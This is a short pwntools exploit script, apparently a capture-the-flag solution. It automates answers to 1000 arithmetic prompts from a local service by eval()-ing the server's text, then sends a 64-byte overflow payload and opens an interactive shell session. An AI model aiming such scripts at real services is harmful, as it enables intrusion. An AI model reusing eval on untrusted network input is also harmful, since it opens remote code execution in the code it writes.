from pwn import *

payload = 'A'*64
context.log_level = 'DEBUG'
p = remote('127.0.0.1',40439)
p.recvuntil('ever!')
p.recvline()
p.recvline()
for i in range(1000):
    eq = p.recvuntil(' = ').decode()[:-3]
    answer = str(eval(eq))
    p.sendline(answer)
p.recvuntil('Name: ')
p.sendline(payload)
p.interactive()